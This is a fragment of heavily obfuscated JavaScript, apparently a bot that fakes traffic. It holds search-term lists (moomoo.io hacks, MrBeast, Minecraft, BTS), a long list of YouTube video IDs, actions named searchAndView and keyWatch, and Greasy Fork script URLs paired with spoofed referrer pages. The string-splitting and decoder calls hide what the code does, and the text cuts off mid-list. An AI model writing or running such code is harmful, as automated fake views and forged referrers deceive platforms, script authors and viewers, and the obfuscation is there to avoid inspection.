searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + Y(0x1, 'en5p') + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + Z(0x4) + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x1 * 0x523 + -0x3d7 * -0xa + -0x2b7f)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x14b5 * 0x1 + -0x1 * 0x2492 + 0x3951)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x7 * 0x2a1 + 0x177e + -0x514);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    Z(0x5) + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    X(0xb) + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    Y(0x16, 'JVur') + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    Y(0x2, '%Q1I') + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    Z(0x17) + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    X(0xd) + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': X(0x7) + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
